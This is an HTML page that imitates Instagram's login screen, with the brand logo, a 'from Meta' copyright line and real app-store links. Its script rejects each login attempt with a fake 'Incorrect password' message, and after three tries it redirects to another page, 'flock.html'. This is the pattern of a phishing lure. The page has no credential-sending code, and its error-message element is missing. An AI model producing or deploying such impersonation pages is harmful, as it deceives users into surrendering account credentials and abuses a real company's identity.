<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- FAVICON -->
    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" type="image/svg+xml">
    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        /* General body styling */
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(to top, #fdfdfd, #e8e8e8);
            height: 100vh;
            flex-direction: column;
        }

        .container {
            background: white;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            padding: 30px 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo img {
            max-width: 180px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .animate-input {
            position: relative;
            width: 100%;
        }

        .animate-input input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            background: #fafafa;
            font-size: 14px;
            color: #333;
            transition: all 0.3s ease;
        }

        .animate-input input:focus {
            border-color: #3897f0;
            outline: none;
        }

        .animate-input span {
            display: block;
            font-size: 12px;
            color: #8e8e8e;
            margin-bottom: 5px;
        }

        .btn-login {
            background-color: #3897f0;
            color: white;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #1e80d0;
        }

        .btn-fb {
            background-color: #3b5998;
            color: white;
            padding: 15px;
            width: 100%;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }

        .btn-fb img {
            margin-right: 10px;
            width: 18px;
        }

        .btn-fb:hover {
            background-color: #2d4373;
        }

        .forgot-pw {
            display: block;
            color: #3897f0;
            font-size: 14px;
            margin-top: 15px;
            text-decoration: none;
        }

        .forgot-pw:hover {
            text-decoration: underline;
        }

        .divine {
            margin: 20px 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .divine div {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divine span {
            margin: 0 10px;
            font-size: 14px;
            color: #8e8e8e;
        }

        .goto {
            margin-top: 20px;
        }

        .goto a {
            color: #3897f0;
            text-decoration: none;
        }

        .footer {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 20px;
            text-align: center;
        }

        .footer a {
            color: #3897f0;
            text-decoration: none;
            margin: 0 5px;
        }

        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .store-link img {
            width: 130px;
            margin: 5px;
        }

        /* Dark Mode Styles */
        .dark-mode {
            background-color: #262626;
            color: white;
        }

        .dark-mode .container {
            background-color: #3a3a3a;
        }

        .dark-mode .animate-input input {
            background-color: #444;
            color: white;
            border-color: #555;
        }

        .dark-mode .btn-login {
            background-color: #1e80d0;
        }

        .dark-mode .btn-fb {
            background-color: #2d4373;
        }

        .dark-mode .forgot-pw {
            color: #3897f0;
        }

        .dark-mode .footer a {
            color: #3897f0;
        }

        .dark-mode .store-link img {
            filter: brightness(0.7);
        }

        .dark-mode-button {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            background-color: #444;
            color: white;
            cursor: pointer;
            font-size: 14px;
            border: none;
        }

        .dark-mode-button:hover {
            background-color: #555;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" />
    </div>
    <form id="contactForm">
        <div class="form-group">
            <div class="animate-input">
                <span>Phone number, username or email</span>
                <input type="text" name="username" id="username" required />
            </div>
        </div>
        <div class="form-group">
            <div class="animate-input">
                <span>Password</span>
                <input type="password" name="password" id="password" required />
                <button type="button" onclick="togglePassword()">Show</button>
            </div>
        </div>
        <button class="btn-login" type="submit">Log In</button>

        <div class="divine">
            <div></div>
            <span>OR</span>
            <div></div>
        </div>
        <div class="btn-group">
            <button class="btn-fb">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Facebook_Logo_2023.svg" alt="Facebook" />
                Log in with Facebook
            </button>
        </div>
        <a href="#" class="forgot-pw">Forgot password?</a>
    </form>
    <div class="goto">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <div class="app-download">
        <p>Get the app.</p>
        <div class="store-link">
            <a href="https://apps.apple.com/us/app/instagram/id389801252">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/App_Store_logo.png" alt="App Store">
            </a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/0b/Google_Play_Store_badge_EN.svg" alt="Google Play">
            </a>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
        <div class="copyright">
            Â© 2024 Instagram from Meta
        </div>
    </div>
    <button class="dark-mode-button" id="darkmode-toggle">Toggle Dark Mode</button>
</div>

<script>
    let attemptCount = 0;

    function togglePassword() {
        var passwordInput = document.getElementById("password");
        var showButton = passwordInput.nextElementSibling;
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            showButton.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            showButton.textContent = "Show";
        }
    }

    document.getElementById('darkmode-toggle').addEventListener('click', function() {
        document.body.classList.toggle('dark-mode');
    });

    async function handleLogin(event) {
        event.preventDefault();
        attemptCount++;

        const errorMessage = document.getElementById("error-message");

        if (attemptCount >= 3) {
            window.location.href = "flock.html"; // Replace with actual URL
        } else {
            errorMessage.textContent = "Incorrect password. Try again.";
        }
    }

    document.getElementById("contactForm").addEventListener("submit", handleLogin);
</script>

</body>
</html>
